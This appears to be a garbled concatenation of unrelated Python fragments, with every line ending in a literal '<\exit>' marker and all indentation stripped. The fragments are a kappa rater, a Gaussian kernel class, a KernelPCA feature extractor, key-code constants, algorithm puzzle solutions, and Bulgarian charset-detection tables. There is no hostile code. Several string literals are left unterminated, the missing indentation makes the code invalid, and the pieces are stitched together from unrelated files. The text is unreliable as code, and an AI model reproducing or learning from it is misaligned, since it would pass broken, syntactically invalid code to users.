def kappa(self):<\exit>
return self.annotation_task.kappa()<\exit>
if __name__=="__main__":<\exit>
for S in ["S2", "S3", "S4"]:<\exit>
kappa_rater = KappaRater(S)<\exit>
print "%s: %f"%(S, kappa_rater.kappa())<\exit>
print "------------------------------<\exit>
import numpy as np<\exit>
class Kernel:<\exit>
def __init__(self, alpha, gammas):<\exit>
self.alpha = np.exp(alpha)<\exit>
self.gammas = np.exp(gammas)<\exit>
self.dim = gammas.size<\exit>
self.nparams = self.dim + 1<\exit>
def set_params(self, params):<\exit>
assert params.size == self.nparams<\exit>
self.alpha = np.exp(params).copy().flatten()[0]<\exit>
self.gammas = np.exp(params).copy().flatten()[1:]<\exit>
def get_params(self):<\exit>
return np.log(np.hstack((self.alpha, self.gammas)))<\exit>
def __call__(self, x1, x2):<\exit>
if x1.size / len(x1) == 1:<\exit>
N1 = 1<\exit>
D1 = x1.size<\exit>
else:<\exit>
N1, D1 = x1.shape<\exit>
if x2.size / len(x2) == 1:<\exit>
N2 = 1<\exit>
D2 = x2.size<\exit>
else:<\exit>
N2, D2 = x2.shape<\exit>
assert D1 == D2, "x1 dimension not equal to x2"<\exit>
assert D1 == self.dim, "data dimension not equal to the kernel"<\exit>
diff = x1.reshape(N1, 1, D1) - x2.reshape(1, N2, D2)<\exit>
diff = self.alpha * np.exp(-np.sum(np.square(diff) * self.gammas, -1) / 2)<\exit>
return diff<\exit>
def gradients(self, x1):<\exit>
N1, D1 = x1.shape<\exit>
diff = x1.reshape(N1, 1, D1) - x1.reshape(1, N1, D1)<\exit>
sqdiff = np.sum(np.square(diff) * self.gammas, -1)<\exit>
expdiff = np.exp(-sqdiff / 2)<\exit>
grads = [-0.5 * g * np.square(diff[:, :, i]) * self.alpha * expdiff for i, g in enumerate(self.gammas)]<\exit>
grads.insert(0, self.alpha * expdiff)<\exit>
return grads<\exit>
def gradients_wrt_data(self, x1, indexn=None, indexd=None):<\exit>
N1, D1 = x1.shape<\exit>
diff = x1.reshape(N1, 1, D1) - x1.reshape(1, N1, D1)<\exit>
sqdiff = np.sum(np.square(diff) * self.gammas, -1)<\exit>
expdiff = np.exp(-sqdiff / 2)<\exit>
rslt = []<\exit>
if (indexn is None) and (indexd is None):<\exit>
for n in range(N1):<\exit>
for d in range(D1):<\exit>
K = np.zeros((N1, N1))<\exit>
K[n, :] = -self.alpha * expdiff[n, :] * self.gammas[d] * (x1[n, d] - x1[:, d])<\exit>
K[:, n] = K[n, :]<\exit>
rslt.append(K.copy())<\exit>
return rslt<\exit>
else:<\exit>
K = np.zeros((N1, N1))<\exit>
K[indexn, :] = -self.alpha * self.gammas[indexd] * (x1[indexn, indexd] - x1[:, indexd]) * expdiff[indexn, :]<\exit>
K[:, indexn] = K[indexn, :]<\exit>
return K.copy()<\exit>
from facerec_py.facerec.feature import AbstractFeature<\exit>
import numpy as np<\exit>
from facerec_py.facerec.util import asColumnMatrix<\exit>
from sklearn.decomposition import KernelPCA<\exit>
class KPCA(AbstractFeature):<\exit>
def __init__(self, num_components=50, kernel="poly", degree=3, coef0=0.0, gamma=None):<\exit>
AbstractFeature.__init__(self)<\exit>
self._num_components = num_components<\exit>
self._kernel = kernel<\exit>
self._degree = degree<\exit>
self._coef0 = coef0<\exit>
self._gamma = gamma<\exit>
self._kpca = None<\exit>
def compute(self, X, y):<\exit>
XC = asColumnMatrix(X)<\exit>
y = np.asarray(y)<\exit>
if self._num_components <= 0 or (self._num_components > XC.shape[1]-1):<\exit>
self._num_components = XC.shape[1]-1<\exit>
self._mean = XC.mean(axis=1).reshape(-1,1)<\exit>
XC = XC - self._mean<\exit>
n_features = XC.shape[0]<\exit>
self._kpca = KernelPCA(n_components=self._num_components,<\exit>
kernel=self._kernel,<\exit>
degree=self._degree,<\exit>
coef0=self._coef0,<\exit>
gamma=self._gamma)<\exit>
self._kpca.fit(XC.T)<\exit>
features = []<\exit>
for x in X:<\exit>
features.append(self.extract(x))<\exit>
return features<\exit>
def extract(self,X):<\exit>
X = np.asarray(X).reshape(-1,1)<\exit>
return self.project(X)<\exit>
def project(self, X):<\exit>
X = X - self._mean<\exit>
return self._kpca.transform(X.T)<\exit>
@property<\exit>
def num_components(self):<\exit>
return self._num_components<\exit>
def __repr__(self):<\exit>
return "KernelPCA (num_components=%d)" % self._num_components<\exit>
def short_name(self):<\exit>
return "KernelPCA<\exit>
CTRL_C = 7<\exit>
CTRL_H = 2<\exit>
CTRL_J = 14<\exit>
CTRL_K = 16<\exit>
CTRL_L = 6<\exit>
CTRL_F = 8<\exit>
ENTER = 13<\exit>
CTRL_U = 11<\exit>
ESC = 27<\exit>
BACKSPACE =  127<\exit>
TAB = 9<\exit>
RIGHT = -1<\exit>
DOWN = -2<\exit>
UP = -3<\exit>
LEFT = -4<\exit>
SHIFTTAB = -5<\exit>
SHIFTENTER = -6<\exit>
SPACE = 32<\exit>
ANTISLASH = 47<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
n, k, A = cipher<\exit>
f = [[0 for _ in xrange(k + 1)] for _ in xrange(n + 1)]<\exit>
for i in xrange(n + 1):<\exit>
for c in xrange(k + 1):<\exit>
f[i][c] = f[i - 1][c]<\exit>
temp = c - A[i - 1]<\exit>
if temp >= 0:<\exit>
f[i][c] = max(f[i - 1][c], f[i - 1][c - A[i - 1]] + A[i - 1], f[i][c - A[i - 1]] + A[i - 1])<\exit>
return f[n][k]<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
n, k = map(int, f.readline().strip().split(' '))<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
cipher = n, k, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution:<\exit>
def kthLargestElement(self, k, A):<\exit>
k = len(A)-k<\exit>
return self.find_kth(A, 0, len(A), k)<\exit>
def find_kth(self, A, i, j, k):<\exit>
p = self.pivot_optimized(A, i, j)<\exit>
if k == p:<\exit>
return A[p]<\exit>
elif k < p:<\exit>
return self.find_kth(A, i, p, k)<\exit>
else:<\exit>
return self.find_kth(A, p+1, j, k)<\exit>
def pivot(self, A, i, j):<\exit>
p = i<\exit>
closed = p<\exit>
for ptr in xrange(i, j):<\exit>
if A[ptr] < A[p]:<\exit>
closed += 1<\exit>
A[closed], A[ptr] = A[ptr], A[closed]<\exit>
A[closed], A[p] = A[p], A[closed]<\exit>
return closed<\exit>
def pivot_optimized(self, A, lo, hi):<\exit>
i = lo<\exit>
j = hi<\exit>
while True:<\exit>
while True:<\exit>
i += 1<\exit>
if i >= hi or A[i] >= A[lo]:<\exit>
break<\exit>
while True:<\exit>
j -= 1<\exit>
if j < lo or A[j] <= A[lo]:<\exit>
break<\exit>
if i >= j:<\exit>
break<\exit>
A[i], A[j] = A[j], A[i]<\exit>
A[lo], A[j] = A[j], A[lo]<\exit>
return j<\exit>
def pivot_3way(self, A, lo, hi):<\exit>
lt = lo-1<\exit>
gt = hi<\exit>
v = A[lo]<\exit>
i = lo<\exit>
while i < gt:<\exit>
if A[i] < v:<\exit>
lt += 1<\exit>
A[lt], A[i] = A[i], A[lt]<\exit>
i += 1<\exit>
elif A[i] > v:<\exit>
gt -= 1<\exit>
A[gt], A[i] = A[i], A[gt]<\exit>
else:<\exit>
i += 1<\exit>
return lt+1, gt<\exit>
if __name__ == "__main__":<\exit>
assert Solution().kthLargestElement(10, range(1, 11)) == 1<\exit>
class QueueNode(object):<\exit>
def __init__(self, val):<\exit>
self.val = val<\exit>
self.q = [val]<\exit>
def __cmp__(self, other):<\exit>
return self.val-other.val<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
def next(self):<\exit>
self.q.pop(0)<\exit>
self.val = self.q[0]<\exit>
class Solution:<\exit>
def kthPrimeNumber(self, k):<\exit>
import heapq<\exit>
h1 = QueueNode(3)<\exit>
h2 = QueueNode(5)<\exit>
h3 = QueueNode(7)<\exit>
heap = [h1, h2, h3]<\exit>
heapq.heapify(heap)<\exit>
for cnt in xrange(k-1):<\exit>
h = heapq.heappop(heap)<\exit>
if h == h1:<\exit>
h1.q.append(h1.val*3)<\exit>
h2.q.append(h1.val*5)<\exit>
h3.q.append(h1.val*7)<\exit>
elif h == h2:<\exit>
h2.q.append(h2.val*5)<\exit>
h3.q.append(h2.val*7)<\exit>
else:<\exit>
h3.q.append(h3.val*7)<\exit>
h.next()<\exit>
heapq.heappush(heap, h)<\exit>
return heapq.heappop(heap).val<\exit>
def kthPrimeNumber_error(self, k):<\exit>
import heapq<\exit>
h1 = QueueNode(3)<\exit>
h2 = QueueNode(5)<\exit>
h3 = QueueNode(7)<\exit>
heap = [h1, h2, h3]<\exit>
heapq.heapify(heap)<\exit>
for cnt in xrange(k-1):<\exit>
h = heapq.heappop(heap)<\exit>
if h == h1:<\exit>
for i in [3, 5, 7]:<\exit>
h1.q.append(i*h1.val)<\exit>
h1.next()<\exit>
heapq.heappush(heap, h1)<\exit>
elif h == h2:<\exit>
for i in [5, 7]:<\exit>
h2.q.append(i*h2.val)<\exit>
h2.next()<\exit>
heapq.heappush(heap, h2)<\exit>
else:<\exit>
for i in [7]:<\exit>
h3.q.append(i*h3.val)<\exit>
h3.next()<\exit>
heapq.heappush(heap, h3)<\exit>
return heapq.heappop(heap).val<\exit>
if __name__ == "__main__":<\exit>
assert Solution().kthPrimeNumber(321) == 14586075<\exit>
Latin5_BulgarianCharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253, 77, 90, 99,100, 72,109,107,101, 79,185, 81,102, 76, 94, 82,<\exit>
110,186,108, 91, 74,119, 84, 96,111,187,115,253,253,253,253,253,<\exit>
253, 65, 69, 70, 66, 63, 68,112,103, 92,194,104, 95, 86, 87, 71,<\exit>
116,195, 85, 93, 97,113,196,197,198,199,200,253,253,253,253,253,<\exit>
194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,<\exit>
210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,<\exit>
81,226,227,228,229,230,105,231,232,233,234,235,236, 45,237,238,<\exit>
31, 32, 35, 43, 37, 44, 55, 47, 40, 59, 33, 46, 38, 36, 41, 30,<\exit>
39, 28, 34, 51, 48, 49, 53, 50, 54, 57, 61,239, 67,240, 60, 56,<\exit>
1, 18,  9, 20, 11,  3, 23, 15,  2, 26, 12, 10, 14,  6,  4, 13,<\exit>
7,  8,  5, 19, 29, 25, 22, 21, 27, 24, 17, 75, 52,241, 42, 16,<\exit>
62,242,243,244, 58,245, 98,246,247,248,249,250,251, 91,252,253,<\exit>
)<\exit>
win1251BulgarianCharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253, 77, 90, 99,100, 72,109,107,101, 79,185, 81,102, 76, 94, 82,<\exit>
110,186,108, 91, 74,119, 84, 96,111,187,115,253,253,253,253,253,<\exit>
253, 65, 69, 70, 66, 63, 68,112,103, 92,194,104, 95, 86, 87, 71,<\exit>
116,195, 85, 93, 97,113,196,197,198,199,200,253,253,253,253,253,<\exit>
206,207,208,209,210,211,212,213,120,214,215,216,217,218,219,220,<\exit>
221, 78, 64, 83,121, 98,117,105,222,223,224,225,226,227,228,229,<\exit>
88,230,231,232,233,122, 89,106,234,235,236,237,238, 45,239,240,<\exit>
73, 80,118,114,241,242,243,244,245, 62, 58,246,247,248,249,250,<\exit>
31, 32, 35, 43, 37, 44, 55, 47, 40, 59, 33, 46, 38, 36, 41, 30,<\exit>
39, 28, 34, 51, 48, 49, 53, 50, 54, 57, 61,251, 67,252, 60, 56,<\exit>
1, 18,  9, 20, 11,  3, 23, 15,  2, 26, 12, 10, 14,  6,  4, 13,<\exit>
7,  8,  5, 19, 29, 25, 22, 21, 27, 24, 17, 75, 52,253, 42, 16,<\exit>
)<\exit>
BulgarianLangModel = (<\exit>
0,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,2,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,0,3,3,3,2,2,3,2,2,1,2,2,<\exit>
3,1,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,0,3,3,3,3,3,3,3,3,3,3,0,3,0,1,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,2,3,3,3,3,3,3,3,3,0,3,1,0,<\exit>
0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,1,3,2,3,3,3,3,3,3,3,3,0,3,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,2,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,1,3,2,3,3,3,3,3,3,3,3,0,3,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,2,3,2,2,1,3,3,3,3,2,2,2,1,1,2,0,1,0,1,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,3,3,3,2,3,2,2,3,3,1,1,2,3,3,2,3,3,3,3,2,1,2,0,2,0,3,0,0,<\exit>
0,0,0,0,0,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,3,3,3,1,3,3,3,3,3,2,3,2,3,3,3,3,3,2,3,3,1,3,0,3,0,2,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,3,3,3,3,1,3,3,2,3,3,3,1,3,3,2,3,2,2,2,0,0,2,0,2,0,2,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,3,3,3,3,3,0,3,3,3,2,2,3,3,3,1,2,2,3,2,1,1,2,0,2,0,0,0,0,<\exit>
1,0,0,0,0,0,0,0,0,0,2,0,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,3,3,3,2,3,3,1,2,3,2,2,2,3,3,3,3,3,2,2,3,1,2,0,2,1,2,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,3,0,0,1,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,3,1,3,3,3,3,3,2,3,3,3,2,3,3,2,3,2,2,2,3,1,2,0,1,0,1,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,3,3,3,3,3,3,3,1,1,1,2,2,1,3,1,3,2,2,3,0,0,1,0,1,0,1,0,0,<\exit>
0,0,0,1,0,0,0,0,1,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,3,2,2,3,2,2,3,1,2,1,1,1,2,3,1,3,1,2,2,0,1,1,1,1,0,1,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,3,1,3,2,2,3,3,1,2,3,1,1,3,3,3,3,1,2,2,1,1,1,0,2,0,2,0,1,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,2,2,3,3,3,2,2,1,1,2,0,2,0,1,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,0,1,2,1,3,3,2,3,3,3,3,3,2,3,2,1,0,3,1,2,1,2,1,2,3,2,1,0,1,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,1,1,2,3,3,3,3,3,3,3,3,3,3,3,3,0,0,3,1,3,3,2,3,3,2,2,2,0,1,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,3,3,3,3,0,3,3,3,3,3,2,1,1,2,1,3,3,0,3,1,1,1,1,3,2,0,1,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,2,2,2,3,3,3,3,3,3,3,3,3,3,3,1,1,3,1,3,3,2,3,2,2,2,3,0,2,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,2,3,3,2,2,3,2,1,1,1,1,1,3,1,3,1,1,0,0,0,1,0,0,0,1,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,2,3,2,0,3,2,0,3,0,2,0,0,2,1,3,1,0,0,1,0,0,0,1,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,2,1,1,1,1,2,1,1,2,1,1,1,2,2,1,2,1,1,1,0,1,1,0,1,0,1,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,2,1,3,1,1,2,1,3,2,1,1,0,1,2,3,2,1,1,1,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,3,3,3,3,2,2,1,0,1,0,0,1,0,0,0,2,1,0,3,0,0,1,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,2,3,2,3,3,1,3,2,1,1,1,2,1,1,2,1,3,0,1,0,0,0,1,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,1,1,2,2,3,3,2,3,2,2,2,3,1,2,2,1,1,2,1,1,2,2,0,1,1,0,1,0,2,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,2,1,3,1,0,2,2,1,3,2,1,0,0,2,0,2,0,1,0,0,0,0,0,0,0,1,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,3,3,1,2,0,2,3,1,2,3,2,0,1,3,1,2,1,1,1,0,0,1,0,0,2,2,2,3,<\exit>
2,2,2,2,1,2,1,1,2,2,1,1,2,0,1,1,1,0,0,1,1,0,0,1,1,0,0,0,1,1,0,1,<\exit>
3,3,3,3,3,2,1,2,2,1,2,0,2,0,1,0,1,2,1,2,1,1,0,0,0,1,0,1,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,3,2,3,3,1,1,3,1,0,3,2,1,0,0,0,1,2,0,2,0,1,0,0,0,1,0,1,2,1,2,2,<\exit>
1,1,1,1,1,1,1,2,2,2,1,1,1,1,1,1,1,0,1,2,1,1,1,0,0,0,0,0,1,1,0,0,<\exit>
3,1,0,1,0,2,3,2,2,2,3,2,2,2,2,2,1,0,2,1,2,1,1,1,0,1,2,1,2,2,2,1,<\exit>
1,1,2,2,2,2,1,2,1,1,0,1,2,1,2,2,2,1,1,1,0,1,1,1,1,2,0,1,0,0,0,0,<\exit>
2,3,2,3,3,0,0,2,1,0,2,1,0,0,0,0,2,3,0,2,0,0,0,0,0,1,0,0,2,0,1,2,<\exit>
2,1,2,1,2,2,1,1,1,2,1,1,1,0,1,2,2,1,1,1,1,1,0,1,1,1,0,0,1,2,0,0,<\exit>
3,3,2,2,3,0,2,3,1,1,2,0,0,0,1,0,0,2,0,2,0,0,0,1,0,1,0,1,2,0,2,2,<\exit>
1,1,1,1,2,1,0,1,2,2,2,1,1,1,1,1,1,1,0,1,1,1,0,0,0,0,0,0,1,1,0,0,<\exit>
2,3,2,3,3,0,0,3,0,1,1,0,1,0,0,0,2,2,1,2,0,0,0,0,0,0,0,0,2,0,1,2,<\exit>
2,2,1,1,1,1,1,2,2,2,1,0,2,0,1,0,1,0,0,1,0,1,0,0,1,0,0,0,0,1,0,0,<\exit>
3,3,3,3,2,2,2,2,2,0,2,1,1,1,1,2,1,2,1,1,0,2,0,1,0,1,0,0,2,0,1,2,<\exit>
1,1,1,1,1,1,1,2,2,1,1,0,2,0,1,0,2,0,0,1,1,1,0,0,2,0,0,0,1,1,0,0,<\exit>
2,3,3,3,3,1,0,0,0,0,0,0,0,0,0,0,2,0,0,1,1,0,0,0,0,0,0,1,2,0,1,2,<\exit>
2,2,2,1,1,2,1,1,2,2,2,1,2,0,1,1,1,1,1,1,0,1,1,1,1,0,0,1,1,1,0,0,<\exit>
2,3,3,3,3,0,2,2,0,2,1,0,0,0,1,1,1,2,0,2,0,0,0,3,0,0,0,0,2,0,2,2,<\exit>
1,1,1,2,1,2,1,1,2,2,2,1,2,0,1,1,1,0,1,1,1,1,0,2,1,0,0,0,1,1,0,0,<\exit>
2,3,3,3,3,0,2,1,0,0,2,0,0,0,0,0,1,2,0,2,0,0,0,0,0,0,0,0,2,0,1,2,<\exit>
1,1,1,2,1,1,1,1,2,2,2,0,1,0,1,1,1,0,0,1,1,1,0,0,1,0,0,0,0,1,0,0,<\exit>
3,3,2,2,3,0,1,0,1,0,0,0,0,0,0,0,1,1,0,3,0,0,0,0,0,0,0,0,1,0,2,2,<\exit>
1,1,1,1,1,2,1,1,2,2,1,2,2,1,0,1,1,1,1,1,0,1,0,0,1,0,0,0,1,1,0,0,<\exit>
3,1,0,1,0,2,2,2,2,3,2,1,1,1,2,3,0,0,1,0,2,1,1,0,1,1,1,1,2,1,1,1,<\exit>
1,2,2,1,2,1,2,2,1,1,0,1,2,1,2,2,1,1,1,0,0,1,1,1,2,1,0,1,0,0,0,0,<\exit>
2,1,0,1,0,3,1,2,2,2,2,1,2,2,1,1,1,0,2,1,2,2,1,1,2,1,1,0,2,1,1,1,<\exit>
1,2,2,2,2,2,2,2,1,2,0,1,1,0,2,1,1,1,1,1,0,0,1,1,1,1,0,1,0,0,0,0,<\exit>
2,1,1,1,1,2,2,2,2,1,2,2,2,1,2,2,1,1,2,1,2,3,2,2,1,1,1,1,0,1,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,2,2,3,2,0,1,2,0,1,2,1,1,0,1,0,1,2,1,2,0,0,0,1,1,0,0,0,1,0,0,2,<\exit>
1,1,0,0,1,1,0,1,1,1,1,0,2,0,1,1,1,0,0,1,1,0,0,0,0,1,0,0,0,1,0,0,<\exit>
2,0,0,0,0,1,2,2,2,2,2,2,2,1,2,1,1,1,1,1,1,1,0,1,1,1,1,1,2,1,1,1,<\exit>
1,2,2,2,2,1,1,2,1,2,1,1,1,0,2,1,2,1,1,1,0,2,1,1,1,1,0,1,0,0,0,0,<\exit>
3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,<\exit>
1,1,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,2,2,3,2,0,0,0,0,1,0,0,0,0,0,0,1,1,0,2,0,0,0,0,0,0,0,0,1,0,1,2,<\exit>
1,1,1,1,1,1,0,0,2,2,2,2,2,0,1,1,0,1,1,1,1,1,0,0,1,0,0,0,1,1,0,1,<\exit>
2,3,1,2,1,0,1,1,0,2,2,2,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,0,1,0,1,2,<\exit>
1,1,1,1,2,1,1,1,1,1,1,1,1,0,1,1,0,1,0,1,0,1,0,0,1,0,0,0,0,1,0,0,<\exit>
2,2,2,2,2,0,0,2,0,0,2,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,2,0,2,2,<\exit>
1,1,1,1,1,0,0,1,2,1,1,0,1,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,2,2,2,2,0,0,2,0,1,1,0,0,0,1,0,0,2,0,2,0,0,0,0,0,0,0,0,0,0,1,1,<\exit>
0,0,0,1,1,1,1,1,1,1,1,1,1,0,1,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,2,2,3,2,0,0,1,0,0,1,0,0,0,0,0,0,1,0,2,0,0,0,1,0,0,0,0,0,0,0,2,<\exit>
1,1,0,0,1,0,0,0,1,1,0,0,1,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,1,2,2,2,1,2,1,2,2,1,1,2,1,1,1,0,1,1,1,1,2,0,1,0,1,1,1,1,0,1,1,<\exit>
1,1,2,1,1,1,1,1,1,0,0,1,2,1,1,1,1,1,1,0,0,1,1,1,0,0,0,0,0,0,0,0,<\exit>
1,0,0,1,3,1,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,2,2,2,1,0,0,1,0,2,0,0,0,0,0,1,1,1,0,1,0,0,0,0,0,0,0,0,2,0,0,1,<\exit>
0,2,0,1,0,0,1,1,2,0,1,0,1,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,2,2,2,2,0,1,1,0,2,1,0,1,1,1,0,0,1,0,2,0,1,0,0,0,0,0,0,0,0,0,1,<\exit>
0,1,0,0,1,0,0,0,1,1,0,0,1,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,2,2,2,2,0,0,1,0,0,0,1,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
0,1,0,1,1,1,0,0,1,1,1,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,0,1,0,0,1,2,1,1,1,1,1,1,2,2,1,0,0,1,0,1,0,0,0,0,1,1,1,1,0,0,0,<\exit>
1,1,2,1,1,1,1,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,2,1,2,1,0,0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,0,0,1,2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,<\exit>
0,1,1,0,1,1,1,0,0,1,0,0,1,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
1,0,1,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,1,0,2,0,0,2,0,1,0,0,1,0,0,1,<\exit>
1,1,0,0,1,1,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,<\exit>
1,1,1,1,1,1,1,2,0,0,0,0,0,0,2,1,0,1,1,0,0,1,1,1,0,1,0,0,0,0,0,0,<\exit>
